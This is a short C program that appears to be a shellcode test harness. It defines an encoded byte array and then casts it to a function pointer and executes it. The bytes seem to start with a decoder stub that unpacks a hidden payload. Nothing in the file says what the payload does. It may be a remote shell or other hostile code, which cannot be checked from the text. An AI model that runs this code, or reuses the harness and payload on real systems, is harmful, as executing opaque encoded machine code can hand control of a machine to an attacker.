#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xb8\xbf\xed\x9e\xe8\xdb\xc4\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x18\x83\xc3\x04\x31\x43\x10\x03\x43\x10\x5d\x18\xf4\xe3\xf9"
"\x7a\x5b\x92\x91\x51\x3f\xd3\x86\xc2\x90\x90\x20\x13\x87\x79"
"\xd2\x7a\x39\x0f\xf1\x2f\x2d\x34\xf5\xcf\xad\x25\x98\xae\xdd"
"\x99\x4f\x41\x3e\xe8\xbe\x8d\x0c\x3e\xec\xff\x43\x1e\xc1\x8c"
"\xf5\x7e\x34\x5e\x89\x0a\x27\xd4\x1e\xde\xc2\x62\x84\x52\x75"
"\xab\x70\xa3\xf6\x8b\x51\x97\xcc\xeb\xda\x74\x4d\x82\x71\x1e"
"\xa3\x34\xe7\x81\xcb\xe6\x98\x33\x4c\xf7\x31\xe7\x1b\x16\x70"
"\x87";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
